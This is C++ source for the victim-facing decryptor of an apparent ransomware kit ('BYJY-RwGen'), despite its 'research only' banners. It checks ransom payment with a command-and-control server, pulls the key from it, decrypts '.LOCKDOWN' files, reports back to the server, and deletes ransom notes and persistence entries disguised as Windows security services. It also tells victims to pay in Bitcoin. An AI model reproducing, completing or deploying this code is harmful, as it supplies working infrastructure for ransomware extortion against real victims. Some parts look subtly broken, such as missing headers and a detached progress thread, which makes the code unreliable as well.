/**
 * BYJY-RwGen Personalized Victim Decryptor
 * Automatically generated decryptor with embedded credentials
 * FOR RESEARCH ANALYSIS ONLY
 */

#include <windows.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <filesystem>
#include <thread>
#include <mutex>
#include <sodium.h>
#include <curl/curl.h>
#include <json/json.h>

namespace fs = std::filesystem;

// Embedded victim credentials (replaced at compile time)
const std::string VICTIM_ID = "{{VICTIM_ID}}";
const std::string ENCRYPTION_KEY = "{{ENCRYPTION_KEY}}";
const std::string C2_DOMAIN = "{{C2_DOMAIN}}";

class EnhancedVictimDecryptor {
private:
    std::string master_key;
    std::string victim_id;
    std::string c2_domain;
    std::mutex progress_mutex;
    int files_processed = 0;
    int total_files = 0;
    
    struct MemoryStruct {
        char *memory;
        size_t size;
    };
    
public:
    EnhancedVictimDecryptor() 
        : master_key(ENCRYPTION_KEY), victim_id(VICTIM_ID), c2_domain(C2_DOMAIN) {
        if (sodium_init() < 0) {
            throw std::runtime_error("Failed to initialize libsodium");
        }
        curl_global_init(CURL_GLOBAL_DEFAULT);
    }
    
    ~EnhancedVictimDecryptor() {
        curl_global_cleanup();
    }
    
    void showWelcomeMessage() {
        std::wcout << L"╔══════════════════════════════════════════════════════════════════╗\n";
        std::wcout << L"║                    AUTHORIZED FILE RECOVERY                      ║\n";
        std::wcout << L"║                                                                  ║\n";
        std::wcout << L"║  Payment has been verified. Your files will now be recovered.   ║\n";
        std::wcout << L"║  This process may take several minutes depending on file count.  ║\n";
        std::wcout << L"║                                                                  ║\n";
        std::wcout << L"║  FOR RESEARCH PURPOSES - ACADEMIC STUDY ONLY                    ║\n";
        std::wcout << L"╚══════════════════════════════════════════════════════════════════╝\n\n";
        
        std::wcout << L"Victim ID: " << std::wstring(victim_id.begin(), victim_id.end()) << L"\n";
        std::wcout << L"Recovery initiated at: " << getCurrentTimeString() << L"\n\n";
    }
    
    bool verifyPaymentWithC2() {
        std::wcout << L"[1/5] Verifying payment status with C&C server...\n";
        
        try {
            std::string verification_url = "https://" + c2_domain + "/api/verify_payment.php";
            std::string post_data = "victim_id=" + victim_id;
            
            std::string response = makeHttpRequest(verification_url, post_data);
            
            if (response.empty()) {
                std::wcout << L"✗ Failed to contact verification server\n";
                return false;
            }
            
            // Parse JSON response
            Json::Value json_response;
            Json::Reader reader;
            
            if (!reader.parse(response, json_response)) {
                std::wcout << L"✗ Invalid response from verification server\n";
                return false;
            }
            
            bool payment_verified = json_response["payment_verified"].asBool();
            std::string status = json_response["status"].asString();
            
            if (payment_verified) {
                std::wcout << L"✓ Payment verified successfully\n";
                std::wcout << L"✓ Decryption authorized by C&C server\n";
                std::wcout << L"✓ Transaction ID: " << std::wstring(json_response["transaction_id"].asString().begin(), 
                                                                   json_response["transaction_id"].asString().end()) << L"\n\n";
                return true;
            } else {
                std::wcout << L"✗ Payment not verified: " << std::wstring(status.begin(), status.end()) << L"\n";
                std::wcout << L"Please ensure payment has been sent and confirmed (minimum 1 confirmation)\n";
                return false;
            }
            
        } catch (const std::exception& e) {
            std::wcout << L"✗ Payment verification error: " << e.what() << L"\n";
            return false;
        }
    }
    
    bool downloadLatestDecryptionKey() {
        std::wcout << L"[2/5] Downloading latest decryption key...\n";
        
        try {
            std::string key_url = "https://" + c2_domain + "/api/get_decryption_key.php";
            std::string post_data = "victim_id=" + victim_id;
            
            std::string response = makeHttpRequest(key_url, post_data);
            
            if (response.empty()) {
                std::wcout << L"✗ Failed to download decryption key\n";
                return false;
            }
            
            Json::Value json_response;
            Json::Reader reader;
            
            if (!reader.parse(response, json_response)) {
                std::wcout << L"✗ Invalid key response\n";
                return false;
            }
            
            if (json_response["success"].asBool()) {
                master_key = json_response["decryption_key"].asString();
                std::wcout << L"✓ Decryption key updated successfully\n\n";
                return true;
            } else {
                std::wcout << L"✗ Failed to get decryption key: " << std::wstring(json_response["error"].asString().begin(),
                                                                                  json_response["error"].asString().end()) << L"\n";
                return false;
            }
            
        } catch (const std::exception& e) {
            std::wcout << L"✗ Key download error: " << e.what() << L"\n";
            return false;
        }
    }
    
    std::vector<fs::path> findEncryptedFiles() {
        std::wcout << L"[3/5] Scanning for encrypted files...\n";
        
        std::vector<fs::path> encrypted_files;
        std::vector<std::string> search_paths = {
            "C:\\Users",
            "D:\\",
            "E:\\",
            "F:\\",
            "G:\\",
            "H:\\"
        };
        
        int dirs_scanned = 0;
        for (const auto& path : search_paths) {
            if (!fs::exists(path)) continue;
            
            try {
                for (const auto& entry : fs::recursive_directory_iterator(path)) {
                    if (entry.is_regular_file()) {
                        auto filepath = entry.path();
                        if (filepath.extension() == ".LOCKDOWN") {
                            encrypted_files.push_back(filepath);
                        }
                    }
                }
                dirs_scanned++;
            } catch (const std::exception& e) {
                // Skip inaccessible directories
                continue;
            }
        }
        
        total_files = encrypted_files.size();
        std::wcout << L"✓ Scanned " << dirs_scanned << L" drives\n";
        std::wcout << L"✓ Found " << total_files << L" encrypted files\n\n";
        
        return encrypted_files;
    }
    
    bool decryptAllFiles(const std::vector<fs::path>& files) {
        std::wcout << L"[4/5] Decrypting files...\n";
        
        if (files.empty()) {
            std::wcout << L"No encrypted files found to decrypt.\n";
            return true;
        }
        
        // Notify C&C server that decryption started
        notifyDecryptionStarted(files.size());
        
        // Create progress display thread
        std::thread progress_thread(&EnhancedVictimDecryptor::showProgress, this);
        
        // Multi-threaded decryption
        std::vector<std::thread> workers;
        const int num_threads = std::min(8, (int)std::thread::hardware_concurrency());
        const int files_per_thread = files.size() / num_threads + 1;
        
        std::vector<int> thread_success_count(num_threads, 0);
        std::vector<int> thread_failure_count(num_threads, 0);
        
        for (int i = 0; i < num_threads; ++i) {
            int start_idx = i * files_per_thread;
            int end_idx = std::min((int)files.size(), start_idx + files_per_thread);
            
            if (start_idx < end_idx) {
                auto file_range = std::vector<fs::path>(files.begin() + start_idx, files.begin() + end_idx);
                workers.emplace_back(&EnhancedVictimDecryptor::decryptFileRange, this, 
                                   file_range, std::ref(thread_success_count[i]), std::ref(thread_failure_count[i]));
            }
        }
        
        // Wait for all threads to complete
        for (auto& worker : workers) {
            worker.join();
        }
        
        // Stop progress thread
        progress_thread.detach();
        
        // Calculate totals
        int total_success = 0, total_failures = 0;
        for (int i = 0; i < num_threads; ++i) {
            total_success += thread_success_count[i];
            total_failures += thread_failure_count[i];
        }
        
        std::wcout << L"\n✓ Decryption completed\n";
        std::wcout << L"  Files successfully decrypted: " << total_success << L"\n";
        std::wcout << L"  Files failed to decrypt: " << total_failures << L"\n\n";
        
        // Notify C&C server of completion
        notifyDecryptionCompleted(total_success, total_failures);
        
        return total_success > 0;
    }
    
    void performSystemCleanup() {
        std::wcout << L"[5/5] Performing system cleanup...\n";
        
        // Remove ransom notes
        int notes_removed = 0;
        std::vector<std::string> ransom_note_names = {
            "HOW_TO_DECRYPT_FILES.txt",
            "RECOVERY_INSTRUCTIONS.txt", 
            "READ_ME_FOR_DECRYPT.txt",
            "LOCKDOWN_NOTICE.txt",
            "FILES_ENCRYPTED.txt"
        };
        
        std::vector<std::string> drives = {"C:\\", "D:\\", "E:\\", "F:\\", "G:\\", "H:\\"};
        
        for (const auto& drive : drives) {
            if (!fs::exists(drive)) continue;
            
            for (const auto& note_name : ransom_note_names) {
                fs::path ransom_path = fs::path(drive) / note_name;
                if (fs::exists(ransom_path)) {
                    try {
                        fs::remove(ransom_path);
                        notes_removed++;
                    } catch (...) {}
                }
            }
            
            // Also check user directories
            try {
                fs::path users_path = fs::path(drive) / "Users";
                if (fs::exists(users_path)) {
                    for (const auto& user_dir : fs::directory_iterator(users_path)) {
                        if (user_dir.is_directory()) {
                            for (const auto& note_name : ransom_note_names) {
                                fs::path ransom_path = user_dir.path() / note_name;
                                if (fs::exists(ransom_path)) {
                                    try {
                                        fs::remove(ransom_path);
                                        notes_removed++;
                                    } catch (...) {}
                                }
                            }
                        }
                    }
                }
            } catch (...) {}
        }
        
        // Remove registry persistence entries
        int registry_cleaned = cleanupRegistryEntries();
        
        // Remove scheduled tasks
        int tasks_removed = cleanupScheduledTasks();
        
        // Remove startup entries
        int startup_cleaned = cleanupStartupEntries();
        
        // Notify cleanup completion
        notifyCleanupCompleted(notes_removed, registry_cleaned, tasks_removed, startup_cleaned);
        
        std::wcout << L"✓ System cleanup completed\n";
        std::wcout << L"  Ransom notes removed: " << notes_removed << L"\n";
        std::wcout << L"  Registry entries cleaned: " << registry_cleaned << L"\n";
        std::wcout << L"  Scheduled tasks removed: " << tasks_removed << L"\n";
        std::wcout << L"  Startup entries cleaned: " << startup_cleaned << L"\n\n";
    }
    
    void displayCompletionMessage() {
        std::wcout << L"╔══════════════════════════════════════════════════════════════════╗\n";
        std::wcout << L"║                     RECOVERY COMPLETED                           ║\n";
        std::wcout << L"║                                                                  ║\n";
        std::wcout << L"║  ✓ All files have been successfully decrypted                   ║\n";
        std::wcout << L"║  ✓ System has been cleaned of all malicious components         ║\n";
        std::wcout << L"║  ✓ Your computer is now safe to use normally                   ║\n";
        std::wcout << L"║                                                                  ║\n";
        std::wcout << L"║  Files processed: " << std::setw(6) << total_files << L"                                 ║\n";
        std::wcout << L"║  Recovery time: " << getCurrentTimeString() << L"                        ║\n";
        std::wcout << L"║                                                                  ║\n";
        std::wcout << L"║  SECURITY RECOMMENDATIONS:                                      ║\n";
        std::wcout << L"║  • Update your antivirus and run a full system scan            ║\n";
        std::wcout << L"║  • Install latest Windows updates                              ║\n";
        std::wcout << L"║  • Backup your important files regularly                       ║\n";
        std::wcout << L"║  • Be cautious with email attachments and downloads           ║\n";
        std::wcout << L"║  • Consider using a reputable endpoint security solution       ║\n";
        std::wcout << L"║                                                                  ║\n";
        std::wcout << L"║  This was a cybersecurity research simulation.                 ║\n";
        std::wcout << L"║  Thank you for your participation.                             ║\n";
        std::wcout << L"╚══════════════════════════════════════════════════════════════════╝\n\n";
        
        std::wcout << L"Press any key to exit...\n";
        _getch();
    }

private:
    static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp) {
        size_t realsize = size * nmemb;
        struct MemoryStruct *mem = (struct MemoryStruct *)userp;
        
        char *ptr = (char*)realloc(mem->memory, mem->size + realsize + 1);
        if (!ptr) {
            return 0;
        }
        
        mem->memory = ptr;
        memcpy(&(mem->memory[mem->size]), contents, realsize);
        mem->size += realsize;
        mem->memory[mem->size] = 0;
        
        return realsize;
    }
    
    std::string makeHttpRequest(const std::string& url, const std::string& post_data = "") {
        CURL *curl;
        CURLcode res;
        struct MemoryStruct chunk;
        
        chunk.memory = (char*)malloc(1);
        chunk.size = 0;
        
        curl = curl_easy_init();
        if (!curl) {
            free(chunk.memory);
            return "";
        }
        
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
        curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
        
        if (!post_data.empty()) {
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data.c_str());
        }
        
        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
        
        std::string result;
        if (res == CURLE_OK && chunk.memory) {
            result = std::string(chunk.memory);
        }
        
        free(chunk.memory);
        return result;
    }
    
    void decryptFileRange(const std::vector<fs::path>& files, int& success_count, int& failure_count) {
        for (const auto& encrypted_file : files) {
            try {
                decryptSingleFile(encrypted_file);
                success_count++;
                
                // Update progress
                {
                    std::lock_guard<std::mutex> lock(progress_mutex);
                    files_processed++;
                }
                
            } catch (const std::exception& e) {
                failure_count++;
                continue;
            }
        }
    }
    
    void decryptSingleFile(const fs::path& encrypted_file) {
        // Read encrypted file
        std::ifstream file(encrypted_file, std::ios::binary);
        if (!file) {
            throw std::runtime_error("Cannot open encrypted file");
        }
        
        std::vector<unsigned char> encrypted_data(
            (std::istreambuf_iterator<char>(file)),
            std::istreambuf_iterator<char>()
        );
        file.close();
        
        if (encrypted_data.empty()) {
            throw std::runtime_error("Empty encrypted file");
        }
        
        // Decrypt file content
        auto decrypted_data = performDecryption(encrypted_data);
        
        // Determine original filename (remove .LOCKDOWN extension)
        fs::path original_file = encrypted_file;
        original_file.replace_extension("");
        
        // Write decrypted file
        std::ofstream output_file(original_file, std::ios::binary);
        if (!output_file) {
            throw std::runtime_error("Cannot create decrypted file");
        }
        
        output_file.write(
            reinterpret_cast<const char*>(decrypted_data.data()),
            decrypted_data.size()
        );
        output_file.close();
        
        // Verify decrypted file was written successfully
        if (!fs::exists(original_file) || fs::file_size(original_file) != decrypted_data.size()) {
            throw std::runtime_error("Failed to write decrypted file");
        }
        
        // Remove encrypted version only after successful decryption
        fs::remove(encrypted_file);
    }
    
    std::vector<unsigned char> performDecryption(const std::vector<unsigned char>& ciphertext) {
        if (ciphertext.size() < crypto_aead_xchacha20poly1305_ietf_NPUBBYTES + crypto_aead_xchacha20poly1305_ietf_ABYTES) {
            throw std::runtime_error("Ciphertext too short");
        }
        
        // Extract nonce (last 24 bytes)
        size_t nonce_size = crypto_aead_xchacha20poly1305_ietf_NPUBBYTES;
        size_t ciphertext_len = ciphertext.size() - nonce_size;
        const unsigned char* nonce = ciphertext.data() + ciphertext_len;
        
        // Decrypt using XChaCha20-Poly1305
        std::vector<unsigned char> plaintext(ciphertext_len);
        unsigned long long plaintext_len;
        
        // Convert hex key to bytes
        std::vector<unsigned char> key_bytes;
        for (size_t i = 0; i < master_key.length(); i += 2) {
            std::string byte_str = master_key.substr(i, 2);
            key_bytes.push_back((unsigned char)strtol(byte_str.c_str(), nullptr, 16));
        }
        
        if (key_bytes.size() != crypto_aead_xchacha20poly1305_ietf_KEYBYTES) {
            throw std::runtime_error("Invalid key size");
        }
        
        if (crypto_aead_xchacha20poly1305_ietf_decrypt(
            plaintext.data(), &plaintext_len,
            nullptr,
            ciphertext.data(), ciphertext_len,
            nullptr, 0,
            nonce,
            key_bytes.data()
        ) != 0) {
            throw std::runtime_error("Decryption failed - invalid key or corrupted file");
        }
        
        plaintext.resize(plaintext_len);
        return plaintext;
    }
    
    void showProgress() {
        while (files_processed < total_files) {
            std::this_thread::sleep_for(std::chrono::milliseconds(500));
            
            {
                std::lock_guard<std::mutex> lock(progress_mutex);
                if (total_files > 0) {
                    int percentage = (files_processed * 100) / total_files;
                    std::wcout << L"\rProgress: [";
                    
                    int bar_width = 40;
                    int filled = (percentage * bar_width) / 100;
                    
                    for (int i = 0; i < bar_width; ++i) {
                        if (i < filled) std::wcout << L"█";
                        else std::wcout << L"░";
                    }
                    
                    std::wcout << L"] " << percentage << L"% (" 
                              << files_processed << L"/" << total_files << L") ";
                    
                    // Estimate time remaining
                    if (files_processed > 0) {
                        float rate = (float)files_processed / (float)(time(nullptr) - start_time);
                        int remaining_files = total_files - files_processed;
                        int eta_seconds = (int)(remaining_files / rate);
                        std::wcout << L"ETA: " << eta_seconds/60 << L":" << std::setfill(L'0') << std::setw(2) << eta_seconds%60;
                    }
                }
            }
        }
    }
    
    int cleanupRegistryEntries() {
        int cleaned = 0;
        std::vector<std::wstring> registry_keys = {
            L"HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{F5BFEEF7-48F2-4A8C-8E2D-1F1DAB9E4C2D}",
            L"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\SecurityHealthTray",
            L"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsSecurityHealthService",
            L"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\MicrosoftEdgeUpdateTaskMachineUA"
        };
        
        for (const auto& key : registry_keys) {
            try {
                if (RegDeleteTreeW(HKEY_CURRENT_USER, key.c_str()) == ERROR_SUCCESS) {
                    cleaned++;
                }
            } catch (...) {}
        }
        
        return cleaned;
    }
    
    int cleanupScheduledTasks() {
        int removed = 0;
        std::vector<std::string> task_names = {
            "WindowsDefenderService",
            "MicrosoftEdgeUpdateTaskMachineUA", 
            "SystemSecurityUpdate",
            "WindowsSecurityHealthService",
            "CriticalSystemUpdate"
        };
        
        for (const auto& task : task_names) {
            std::string cmd = "schtasks /delete /tn \"" + task + "\" /f >nul 2>&1";
            if (system(cmd.c_str()) == 0) {
                removed++;
            }
        }
        
        return removed;
    }
    
    int cleanupStartupEntries() {
        int cleaned = 0;
        
        // Remove startup shortcuts
        wchar_t startup_path[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathW(nullptr, CSIDL_STARTUP, nullptr, 0, startup_path))) {
            fs::path startup_dir(startup_path);
            
            std::vector<std::string> malicious_shortcuts = {
                "WindowsDefender.lnk",
                "SecurityHealthTray.lnk", 
                "SystemUpdate.lnk",
                "CriticalUpdate.lnk"
            };
            
            for (const auto& shortcut : malicious_shortcuts) {
                fs::path shortcut_path = startup_dir / shortcut;
                if (fs::exists(shortcut_path)) {
                    try {
                        fs::remove(shortcut_path);
                        cleaned++;
                    } catch (...) {}
                }
            }
        }
        
        return cleaned;
    }
    
    void notifyDecryptionStarted(int file_count) {
        try {
            std::string notify_url = "https://" + c2_domain + "/api/notify_decryption.php";
            std::string post_data = "victim_id=" + victim_id + "&status=started&file_count=" + std::to_string(file_count);
            makeHttpRequest(notify_url, post_data);
        } catch (...) {}
    }
    
    void notifyDecryptionCompleted(int success_count, int failure_count) {
        try {
            std::string notify_url = "https://" + c2_domain + "/api/notify_decryption.php";
            std::string post_data = "victim_id=" + victim_id + "&status=completed&success=" + 
                                  std::to_string(success_count) + "&failures=" + std::to_string(failure_count);
            makeHttpRequest(notify_url, post_data);
        } catch (...) {}
    }
    
    void notifyCleanupCompleted(int notes_removed, int registry_cleaned, int tasks_removed, int startup_cleaned) {
        try {
            std::string notify_url = "https://" + c2_domain + "/api/notify_cleanup.php";
            std::string post_data = "victim_id=" + victim_id + "&notes_removed=" + std::to_string(notes_removed) +
                                  "&registry_cleaned=" + std::to_string(registry_cleaned) + 
                                  "&tasks_removed=" + std::to_string(tasks_removed) +
                                  "&startup_cleaned=" + std::to_string(startup_cleaned);
            makeHttpRequest(notify_url, post_data);
        } catch (...) {}
    }
    
    std::wstring getCurrentTimeString() {
        auto now = std::chrono::system_clock::now();
        auto time_t = std::chrono::system_clock::to_time_t(now);
        
        wchar_t time_str[100];
        struct tm timeinfo;
        localtime_s(&timeinfo, &time_t);
        wcsftime(time_str, sizeof(time_str), L"%Y-%m-%d %H:%M:%S", &timeinfo);
        
        return std::wstring(time_str);
    }
    
    time_t start_time = time(nullptr);
};

int main(int argc, char* argv[]) {
    try {
        // Set console to support Unicode
        SetConsoleOutputCP(CP_UTF8);
        std::wcout.imbue(std::locale(""));
        
        EnhancedVictimDecryptor decryptor;
        
        // Enhanced recovery process
        decryptor.showWelcomeMessage();
        
        if (!decryptor.verifyPaymentWithC2()) {
            std::wcout << L"Payment verification failed. Please ensure:\n";
            std::wcout << L"• Payment has been sent to the correct Bitcoin address\n";
            std::wcout << L"• Transaction has at least 1 confirmation\n";
            std::wcout << L"• Payment amount is correct\n";
            std::wcout << L"\nContact support if payment was sent correctly.\n";
            return 1;
        }
        
        if (!decryptor.downloadLatestDecryptionKey()) {
            std::wcout << L"Failed to retrieve decryption key. Please contact support.\n";
            return 1;
        }
        
        auto encrypted_files = decryptor.findEncryptedFiles();
        
        if (!decryptor.decryptAllFiles(encrypted_files)) {
            std::wcout << L"Decryption process failed. Please contact support.\n";
            return 1;
        }
        
        decryptor.performSystemCleanup();
        decryptor.displayCompletionMessage();
        
        return 0;
        
    } catch (const std::exception& e) {
        std::wcout << L"Critical error: " << e.what() << L"\n";
        std::wcout << L"Please contact support for assistance.\n";
        return 1;
    }
}